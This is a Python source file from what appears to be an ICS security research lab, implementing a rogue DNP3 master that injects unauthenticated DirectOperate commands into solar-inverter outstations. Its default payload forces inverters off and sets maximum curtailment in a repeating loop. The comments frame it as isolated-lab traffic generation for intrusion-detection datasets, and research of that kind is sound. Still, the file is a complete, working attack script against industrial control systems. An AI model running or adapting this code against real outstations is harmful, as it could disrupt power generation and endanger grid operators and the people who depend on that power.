#!/usr/bin/env python3

# Author: Van Sanh Vu, Purpose: DNP3 development
# FILE PURPOSE: Attack logic for the solar_plant_attack scenario (Activity 2).
# Runs inside the isolated ICS-SimLab lab network ONLY, to generate labelled malicious
# DNP3 traffic for IDS/XAI dataset research. The attacker acts as a rogue DNP3 master and
# connects to the solar-inverter outstations over DNP3-TCP (port 20000), mirroring the
# legitimate master's connection API (src/components/dnp3_master.py). Attack type and
# intensity are selected via config (ATTACK_TYPE / ATTACK_INTENSITY env vars), so new
# attack types are added by extending ATTACKS below — no change to attacker.py.
#
# Scope note: this reproduces attack #4 (unauthorised command injection) from
# .claude/doc/attack-support.md. The outstation accepts FC 0x03 DirectOperate regardless
# of source (no auth in v1) — the whole point of the dataset is to capture that gap so the
# IDS can learn to flag it. This module is for the lab scenario only.

import time
import logging
import multiprocessing

from pydnp3 import asiodnp3, asiopal, opendnp3, openpal

logging.basicConfig(level=logging.INFO, format='%(levelname)s - %(message)s')

# Seconds between injected commands, by intensity label.
_INTENSITY_INTERVAL = {"low": 30.0, "medium": 10.0, "high": 2.0}


# NOTE: The rogue master deliberately uses the library's C++ SOE handler
# (PrintingSOEHandler) and C++ master application (DefaultMasterApplication) rather than
# Python subclasses. dnp3-python invokes those virtual methods from asio worker threads;
# a Python override there races the GIL and segfaults the process once commands/polls run
# concurrently. The C++ implementations never re-enter the interpreter, so the long-
# running attacker stays alive across injection cycles (needed for unattended datasets).


# PURPOSE: Opens a rogue DNP3 master session to one outstation; returns live handles.
def _connect(manager, target, master_address):
    """Build a TCP client + master toward one target outstation and enable it."""
    name = target["name"]
    ip = target["ip"]
    port = target.get("port", 20000)
    outstation_addr = target["outstation_address"]

    channel = manager.AddTCPClient(
        f"rogue_{name}",
        opendnp3.levels.NORMAL,
        asiopal.ChannelRetry().Default(),
        ip,
        "0.0.0.0",
        port,
        asiodnp3.PrintingChannelListener().Create()
    )

    stack_config = asiodnp3.MasterStackConfig()
    stack_config.master.responseTimeout = openpal.TimeDuration().Seconds(5)
    stack_config.link.LocalAddr = master_address
    stack_config.link.RemoteAddr = outstation_addr

    soe = asiodnp3.PrintingSOEHandler().Create()
    app = asiodnp3.DefaultMasterApplication().Create()
    master = channel.AddMaster(f"rogue_master_{name}", soe, app, stack_config)
    master.Enable()
    logging.info("rogue master connected to %s at %s:%d (outstation=%d)",
                 name, ip, port, outstation_addr)
    # Keep strong refs — pybind11 holds only weak refs; GC would break dispatch.
    return {"master": master, "channel": channel, "soe": soe, "app": app, "name": name}


# PURPOSE: Sends one unauthorised DirectOperate (binary or analogue) to a connected master.
def _inject_once(session, cmd_type, index, value):
    """Fire a single FC 0x03 command at the outstation behind `session`."""
    master = session["master"]
    label = f"{session['name']}:{cmd_type}[{index}]={value}"
    # Use the library's C++ result callback (PrintingCommandCallback), NOT a Python
    # closure. dnp3-python invokes the completion callback from an asio worker thread; a
    # Python callback there races the GIL ("thread state NULL") and segfaults the process.
    # The C++ callback never re-enters the interpreter. We log the send synchronously
    # below; the effect is verified via SQLite / Wireshark.
    callback = asiodnp3.PrintingCommandCallback.Get()
    try:
        if cmd_type == "binary_output":
            code = opendnp3.ControlCode.LATCH_ON if int(value) else opendnp3.ControlCode.LATCH_OFF
            master.DirectOperate(opendnp3.ControlRelayOutputBlock(code), int(index), callback)
        elif cmd_type == "analogue_output":
            master.DirectOperate(opendnp3.AnalogOutputDouble64(float(value)), int(index), callback)
        else:
            logging.warning("unknown cmd_type %s — skipped", cmd_type)
            return
        logging.info("INJECTED %s", label)
    except Exception as e:
        logging.error("injection failed [%s]: %s", label, e)


# PURPOSE: Deliver exactly ONE injected command, run inside a child process, then exit.
def _inject_single(target, master_address, cmd):
    """Connect to one target, send one DirectOperate, wait for delivery, then exit.

    dnp3-python 0.3.0b2 crashes the process when a command task COMPLETES (a native-thread
    GIL fault that occurs with Python or C++ callbacks alike). The outstation, however,
    executes FC 0x03 the moment the request frame arrives — before the master processes
    the response — so the injection always lands first. Isolating a single command per
    forked child means that per-command crash never blocks the next command or the parent:
    both the binary and the analogue setpoint reliably reach the outstation.
    """
    manager = asiodnp3.DNP3Manager(1, asiodnp3.ConsoleLogger().Create())
    try:
        session = _connect(manager, target, master_address)
    except Exception as e:
        logging.error("could not connect to %s: %s", target.get("name"), e)
        return

    time.sleep(2)  # let the link settle before injecting
    _inject_once(session, cmd["type"], cmd["index"], cmd["value"])
    time.sleep(2)  # allow the request frame to reach the outstation and be executed


# PURPOSE: Attack #4 parent loop — fork one isolated child per command, survive its crashes.
def _command_injection(targets, master_address, config):
    """Fire each payload command at each target per interval; cadence set by intensity."""
    intensity = config.get("attack", {}).get("intensity", "low")
    interval = _INTENSITY_INTERVAL.get(intensity, 30.0)

    # Default malicious payload: force inverter OFF (binary out 0) and max curtailment
    # (analogue out 0). These indices match the solar_plant outstation config.
    payload = config.get("attack", {}).get("payload", [
        {"type": "binary_output",   "index": 0, "value": 0},
        {"type": "analogue_output", "index": 0, "value": 100.0},
    ])

    # fork (not spawn): the parent holds no DNP3 manager / asio threads, so forking is
    # clean, and the child inherits this already-loaded module without needing re-import.
    ctx = multiprocessing.get_context("fork")

    logging.info("command_injection started: intensity=%s interval=%.0fs targets=%d",
                 intensity, interval, len(targets))
    cycle = 0
    while True:
        cycle += 1
        for target in targets:
            for cmd in payload:
                p = ctx.Process(target=_inject_single, args=(target, master_address, cmd))
                p.start()
                p.join(timeout=15)
                if p.is_alive():
                    logging.warning("cycle %d: %s %s timed out — terminating",
                                    cycle, target["name"], cmd["type"])
                    p.terminate()
                    p.join(5)
                elif p.exitcode not in (0, None):
                    # Expected library teardown crash; the frame was already delivered.
                    logging.info("cycle %d: %s %s delivered (child rc=%s)",
                                 cycle, target["name"], cmd["type"], p.exitcode)
        time.sleep(interval)


# Dispatch table — add future attack types here (keyed by ATTACK_TYPE).
ATTACKS = {
    "command_injection": _command_injection,
}


# PURPOSE: Entry point called by attacker.py — dispatches to the selected attack.
def run(targets, master_address, config):
    """targets: list of {name, ip, outstation_address, port}; dispatch by attack.type."""
    attack_type = config.get("attack", {}).get("type", "none")
    if attack_type in ("none", ""):
        logging.info("attack type 'none' — rogue master idle, no injection")
        while True:
            time.sleep(3600)

    handler = ATTACKS.get(attack_type)
    if handler is None:
        logging.error("unsupported attack type '%s' (known: %s)", attack_type, list(ATTACKS))
        return

    handler(targets, master_address, config)
